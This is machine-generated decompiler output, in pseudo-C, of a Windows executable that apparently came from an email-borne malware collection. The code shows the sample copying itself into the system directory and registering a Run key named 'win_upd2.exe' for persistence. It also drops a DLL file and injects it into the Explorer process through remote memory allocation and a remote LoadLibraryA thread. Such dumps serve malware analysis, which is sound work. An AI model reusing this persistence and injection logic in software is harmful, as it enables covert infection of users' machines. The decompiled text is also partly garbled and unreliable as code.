/*	This file was automatically created by
 *	Reverse Engineering Compiler 1.6 (C) Giampiero Caprino (Mar 31 2002)
 *	Input file: './malware_via_email/malware_0050/ia32_pe/subject.exe'
 */

/*	Procedure: 0x00401000 - 0x00401040
 *	Argument size: 8
 *	Local size: 0
 *	Save regs size: 12
 */

L00401000(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{
	/* unknown */ void  ebx;



    (save)A8;
    eax = LoadLibraryA();
    if(eax != 0) {
        for(asm("xchg eax,ebx");; 1; asm("lodsd");) {
            asm("cld");
            eax = 0;
            ecx = ecx | -1;
            asm("repne scasb");
            if(*A8 == 0) {
                break;
            }
            eax = GetProcAddress(ebx, A8);
            *Ac = eax;
            if(eax == 0) {
                goto L0040103a;
            }
        }
        eax = 1;
    }
L0040103a:
}

/*	Procedure: 0x00401041 - 0x0040108C
 *	Argument size: 12
 *	Local size: 0
 *	Save regs size: 0
 */

L00401041(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{



    esp = esp + -8;
    eax = CreateFileA(A8, 1073741824, 3, 0, 2, 0, 0);
    *(ebp - 4) = eax;
    if(!(eax = *(ebp - 4) + 1)) {
        return;
    }
    WriteFile();
    CloseHandle( *(ebp - 4), *(ebp - 4), Ac, A10, ebp - 8, 0);
    return(1);
}

/*	Procedure: 0x0040108D - 0x00401197
 *	Argument size: 8
 *	Local size: 0
 *	Save regs size: 0
 */

L0040108D(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{



    esp = esp + -24;
    (save)ebx;
    if(L00401000("kernel32.dll", 0x405ec8) != 0) {
        (save)A8;
        (save)0;
        (save)1082;
        eax = OpenProcess();
        *(ebp - 4) = eax;
        if(eax != 0) {
            (save)Ac;
            *(ebp - 12) = lstrlenA();
            (save)4;
            (save)4096;
            (save) *(ebp - 12);
            (save)0;
            (save) *(ebp - 4);
            eax = *L00405ec8();
            *(ebp - 8) = eax;
            ebx = 0;
            if(eax != 0) {
                (save)0;
                (save) *(ebp - 12);
                (save)Ac;
                (save) *(ebp - 8);
                (save) *(ebp - 4);
                if(*L00405ed4() != 0) {
                    (save)"kernel32.dll";
                    (save)"LoadLibraryA";
                    (save)GetModuleHandleA();
                    (save)ebp - 16;
                    (save)0;
                    (save) *(ebp - 8);
                    (save)GetProcAddress();
                    (save)0;
                    (save)0;
                    (save) *(ebp - 4);
                    eax = *L00405ed0();
                    *(ebp - 20) = eax;
                    if(*(ebp - 20) != 0) {
                        (save)-1;
                        (save) *(ebp - 20);
                        WaitForSingleObject();
                        (save)ebp - 24;
                        (save) *(ebp - 20);
                        GetExitCodeThread();
                        ebx = *(ebp - 24);
                        (save) *(ebp - 20);
                        CloseHandle();
                    }
                }
                (save)32768;
                (save)0;
                (save) *(ebp - 8);
                (save) *(ebp - 4);
                *L00405ecc();
            }
            (save) *(ebp - 4);
            CloseHandle();
            eax = ebx;
        }
    } else {
        (save)0x405edc;
        eax = LoadLibraryA();
        if(eax != 0) {
            while(1) {
                Sleep(10000);
            }
        }
    }
    (restore)ebx;
}

/*	Procedure: 0x00401198 - 0x004011DC
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L00401198(A8)
/* unknown */ void  A8;
{



    esp = esp + -4;
    (save)ebp - 4;
    (save)"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
    (save)A8;
    RegCreateKeyA();
    (save)0x405fe1;
    RegSetValueExA();
    return(RegCloseKey( *(ebp - 4), *(ebp - 4), "win_upd2.exe", 0, 1, 0x405fe1, lstrlenA() + 1));
}

/*	Procedure: 0x004011DD - 0x004012F7
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

__entry_point__()
{



    (save)260;
    (save)0x405fe1;
    GetSystemDirectoryA();
    (save)"\W%\ @";
    (save)0x405fe1;
    lstrcatA();
    (save)260;
    (save)4219110;
    (save)0;
    GetModuleFileNameA();
    L00401198(-2147483647);
    L00401198(-2147483646);
    (save)0x405fe1;
    (save)4219110;
    if(lstrcmpiA() != 0) {
        (save)128;
        (save)0x405fe1;
        SetFileAttributesA();
        (save)0;
        (save)0x405fe1;
        (save)4219110;
        if(CopyFileA() != 0) {
            (save)128;
            (save)0x405fe1;
            SetFileAttributesA();
            (save)0;
            (save)0;
            (save)0;
            (save)0x405fe1;
            (save)0x405e26;
            (save)0;
            ShellExecuteA();
        }
        (save)0;
        ExitProcess();
    }
    (save)260;
    (save)0x405edc;
    GetSystemDirectoryA();
    (save)"\_dll.exe";
    (save)0x405edc;
    lstrcatA();
    (save)128;
    (save)0x405edc;
    SetFileAttributesA();
    if(L00401041(0x405edc, "MZdll.exe", 11776) != 0) {
        (save)0;
        (save)"Shell_TrayWnd";
        (save)0x405ed8;
        (save)FindWindowA();
        GetWindowThreadProcessId();
        L0040108D( *L00405ED8, 0x405edc);
    }
    (save)0;
    ExitProcess();
    asm("int3");
}

/* DEST BLOCK NOT FOUND: 004012f8 -> 0040130a */
/* DEST BLOCK NOT FOUND: 004012fe -> 0040130a */
/*	Procedure: 0x004012F8 - 0x004012FD
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

CloseHandle()
{



    goto ( *__imp__CloseHandle);
}

/* DEST BLOCK NOT FOUND: 004012fe -> 0040130a */
/*	Procedure: 0x004012FE - 0x00401303
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

CopyFileA()
{



    goto ( *__imp__CopyFileA);
}

/*	Procedure: 0x00401304 - 0x00401309
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

CreateFileA()
{



    goto ( *__imp__CreateFileA);
}

/*	Procedure: 0x0040130A - 0x0040130F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

ExitProcess()
{



    goto ( *__imp__ExitProcess);
}

/* DEST BLOCK NOT FOUND: 00401310 -> 0040130a */
/*	Procedure: 0x00401310 - 0x00401315
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

GetExitCodeThread()
{



    goto ( *__imp__GetExitCodeThread);
}

/* DEST BLOCK NOT FOUND: 00401316 -> 0040130a */
/*	Procedure: 0x00401316 - 0x0040131B
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

GetModuleFileNameA()
{



    goto ( *__imp__GetModuleFileNameA);
}

/* DEST BLOCK NOT FOUND: 0040131c -> 0040130a */
/*	Procedure: 0x0040131C - 0x00401321
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

GetModuleHandleA()
{



    goto ( *__imp__GetModuleHandleA);
}

/* DEST BLOCK NOT FOUND: 00401322 -> 0040130a */
/*	Procedure: 0x00401322 - 0x00401327
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

GetProcAddress()
{



    goto ( *__imp__GetProcAddress);
}

/* DEST BLOCK NOT FOUND: 00401328 -> 0040130a */
/*	Procedure: 0x00401328 - 0x0040132D
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

GetSystemDirectoryA()
{



    goto ( *__imp__GetSystemDirectoryA);
}

/* DEST BLOCK NOT FOUND: 0040132e -> 0040130a */
/*	Procedure: 0x0040132E - 0x00401333
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

LoadLibraryA()
{



    goto ( *__imp__LoadLibraryA);
}

/* DEST BLOCK NOT FOUND: 00401334 -> 0040130a */
/*	Procedure: 0x00401334 - 0x00401339
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

OpenProcess()
{



    goto ( *__imp__OpenProcess);
}

/* DEST BLOCK NOT FOUND: 0040133a -> 0040130a */
/*	Procedure: 0x0040133A - 0x0040133F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

SetFileAttributesA()
{



    goto ( *__imp__SetFileAttributesA);
}

/* DEST BLOCK NOT FOUND: 00401340 -> 0040130a */
/*	Procedure: 0x00401340 - 0x00401345
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

Sleep()
{



    goto ( *__imp__Sleep);
}

/* DEST BLOCK NOT FOUND: 00401346 -> 0040130a */
/*	Procedure: 0x00401346 - 0x0040134B
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

WaitForSingleObject()
{



    goto ( *__imp__WaitForSingleObject);
}

/* DEST BLOCK NOT FOUND: 0040134c -> 0040130a */
/*	Procedure: 0x0040134C - 0x00401351
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

WriteFile()
{



    goto ( *__imp__WriteFile);
}

/* DEST BLOCK NOT FOUND: 00401352 -> 0040130a */
/*	Procedure: 0x00401352 - 0x00401357
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

lstrcatA()
{



    goto ( *__imp__lstrcatA);
}

/* DEST BLOCK NOT FOUND: 00401358 -> 0040130a */
/*	Procedure: 0x00401358 - 0x0040135D
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

lstrcmpiA()
{



    goto ( *__imp__lstrcmpiA);
}

/* DEST BLOCK NOT FOUND: 0040135e -> 0040130a */
/*	Procedure: 0x0040135E - 0x00401363
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

lstrlenA()
{



    goto ( *__imp__lstrlenA);
}

/* DEST BLOCK NOT FOUND: 00401364 -> 0040130a */
/*	Procedure: 0x00401364 - 0x00401369
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

FindWindowA()
{



    goto ( *__imp__FindWindowA);
}

/* DEST BLOCK NOT FOUND: 0040136a -> 0040130a */
/*	Procedure: 0x0040136A - 0x0040136F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

GetWindowThreadProcessId()
{



    goto ( *__imp__GetWindowThreadProcessId);
}

/* DEST BLOCK NOT FOUND: 00401370 -> 0040130a */
/*	Procedure: 0x00401370 - 0x00401375
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

ShellExecuteA()
{



    goto ( *__imp__ShellExecuteA);
}

/* DEST BLOCK NOT FOUND: 00401376 -> 0040130a */
/*	Procedure: 0x00401376 - 0x0040137B
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

RegCloseKey()
{



    goto ( *__imp__RegCloseKey);
}

/* DEST BLOCK NOT FOUND: 0040137c -> 0040130a */
/*	Procedure: 0x0040137C - 0x00401381
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

RegCreateKeyA()
{



    goto ( *__imp__RegCreateKeyA);
}

/* DEST BLOCK NOT FOUND: 00401382 -> 0040130a */
/*	Procedure: 0x00401382 - 0x00401386
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

RegSetValueExA()
{



    goto ( *__imp__RegSetValueExA);
}

/* address  size  */
/* 0x004011dd       0 */ /* unknown */ void 	__entry_point__;
/* 0x004012f8       0 */ /* unknown */ void 	CloseHandle;
/* 0x004012fe       0 */ /* unknown */ void 	CopyFileA;
/* 0x00401304       0 */ /* unknown */ void 	CreateFileA;
/* 0x0040130a       0 */ /* unknown */ void 	ExitProcess;
/* 0x00401310       0 */ /* unknown */ void 	GetExitCodeThread;
/* 0x00401316       0 */ /* unknown */ void 	GetModuleFileNameA;
/* 0x0040131c       0 */ /* unknown */ void 	GetModuleHandleA;
/* 0x00401322       0 */ /* unknown */ void 	GetProcAddress;
/* 0x00401328       0 */ /* unknown */ void 	GetSystemDirectoryA;
/* 0x0040132e       0 */ /* unknown */ void 	LoadLibraryA;
/* 0x00401334       0 */ /* unknown */ void 	OpenProcess;
/* 0x0040133a       0 */ /* unknown */ void 	SetFileAttributesA;
/* 0x00401340       0 */ /* unknown */ void 	Sleep;
/* 0x00401346       0 */ /* unknown */ void 	WaitForSingleObject;
/* 0x0040134c       0 */ /* unknown */ void 	WriteFile;
/* 0x00401352       0 */ /* unknown */ void 	lstrcatA;
/* 0x00401358       0 */ /* unknown */ void 	lstrcmpiA;
/* 0x0040135e       0 */ /* unknown */ void 	lstrlenA;
/* 0x00401364       0 */ /* unknown */ void 	FindWindowA;
/* 0x0040136a       0 */ /* unknown */ void 	GetWindowThreadProcessId;
/* 0x00401370       0 */ /* unknown */ void 	ShellExecuteA;
/* 0x00401376       0 */ /* unknown */ void 	RegCloseKey;
/* 0x0040137c       0 */ /* unknown */ void 	RegCreateKeyA;
/* 0x00401382       0 */ /* unknown */ void 	RegSetValueExA;
/* 0x00402000       0 */ /* unknown */ void 	__imp__ShellExecuteA;
/* 0x00402008       0 */ /* unknown */ void 	__imp__RegCloseKey;
/* 0x0040200c       0 */ /* unknown */ void 	__imp__RegCreateKeyA;
/* 0x00402010       0 */ /* unknown */ void 	__imp__RegSetValueExA;
/* 0x00402018       0 */ /* unknown */ void 	__imp__GetExitCodeThread;
/* 0x0040201c       0 */ /* unknown */ void 	__imp__GetModuleFileNameA;
/* 0x00402020       0 */ /* unknown */ void 	__imp__GetModuleHandleA;
/* 0x00402024       0 */ /* unknown */ void 	__imp__GetProcAddress;
/* 0x00402028       0 */ /* unknown */ void 	__imp__GetSystemDirectoryA;
/* 0x0040202c       0 */ /* unknown */ void 	__imp__LoadLibraryA;
/* 0x00402030       0 */ /* unknown */ void 	__imp__OpenProcess;
/* 0x00402034       0 */ /* unknown */ void 	__imp__Sleep;
/* 0x00402038       0 */ /* unknown */ void 	__imp__WaitForSingleObject;
/* 0x0040203c       0 */ /* unknown */ void 	__imp__WriteFile;
/* 0x00402040       0 */ /* unknown */ void 	__imp__lstrcatA;
/* 0x00402044       0 */ /* unknown */ void 	__imp__lstrcmpiA;
/* 0x00402048       0 */ /* unknown */ void 	__imp__lstrlenA;
/* 0x0040204c       0 */ /* unknown */ void 	__imp__ExitProcess;
/* 0x00402050       0 */ /* unknown */ void 	__imp__CreateFileA;
/* 0x00402054       0 */ /* unknown */ void 	__imp__CopyFileA;
/* 0x00402058       0 */ /* unknown */ void 	__imp__SetFileAttributesA;
/* 0x0040205c       0 */ /* unknown */ void 	__imp__CloseHandle;
/* 0x00402064       0 */ /* unknown */ void 	__imp__FindWindowA;
/* 0x00402068       0 */ /* unknown */ void 	__imp__GetWindowThreadProcessId;
#if 0 /* auxiliary information */
# Current option values:
option: +asmflush
option: -compactcalls
option: +compactexprs
option: +compactifs
option: +compset
option: -dfoproc
option: -disasmonly
option: -displaylabels
option: +doblocks
option: +docase
option: +dofor
option: +doifs
option: +dointrinsics
option: +doloops
option: +donullgotos
option: +dopackloops
option: +dopackstmt
option: +doremlabs
option: +dosimplify
option: -dosort
option: +dostmts
option: +doswitch
option: +dowhile
option: -dumpaddrs
option: -dumpcall
option: -dumpcomments
option: -dumpdfo
option: +dumpdoms
option: -dumpsblocks
option: -dumpsets
option: -dumpsizes
option: -dumpstmtid
option: +fatcase
option: -flag16
option: +fullscreen
option: -genpattern
option: -help
option: -hexconst
option: -html
option: +insertlabels
option: -int16
option: +int32
option: -interactive
option: -isvb5
option: +locals
option: -nohtmltabs
option: -nostackoffs
option: -objdump
option: -okclone
option: -outprocs
option: -outrefs
option: -overrule
option: +rdonly
option: -showblocks
option: -showjump
option: -showlabel
option: -showprotosym
option: -showreg
option: -showstring
option: -silent
option: +simplifyexprs
option: -stackalign16
option: -stackalign4
option: -stackalign8
option: -strallregions
option: -traceall
option: -tracesets
option: +types
option: -usesymtab
option: -validatebr
option: -validatereg
option: +validatestr
#endif
